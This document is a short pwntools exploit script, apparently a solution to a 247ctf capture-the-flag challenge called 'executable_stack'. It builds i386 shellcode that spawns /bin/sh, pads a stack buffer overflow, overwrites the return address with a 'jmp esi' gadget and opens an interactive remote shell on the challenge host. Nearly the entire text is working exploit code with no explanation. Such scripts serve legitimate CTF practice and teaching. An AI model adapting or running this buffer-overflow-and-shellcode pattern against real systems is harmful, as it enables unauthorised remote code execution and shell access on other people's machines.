#!/bin/python3

from pwn import *
context.arch = 'i386'

p = remote('a1a92372d29a3a65.247ctf.com', 50218)
e = ELF('./executable_stack')

shellcode = asm("""

    .rept 50
    nop
    .endr

    push 0x0068732F
    push 0x6E69622F

    xor eax, eax
    xor ecx, ecx
    xor edx, edx
    mov al, 0x0B
    mov ebx, esp

    int 0x80

""")

# It does some other stuff but we won't worry about that lmao
jmp_esi_gadget = 0x80484b3

payload = b'i' * 0x8C + p32(jmp_esi_gadget) + shellcode
p.sendline(payload)

# Should have a shell at this point, can cat it out manually
p.interactive()

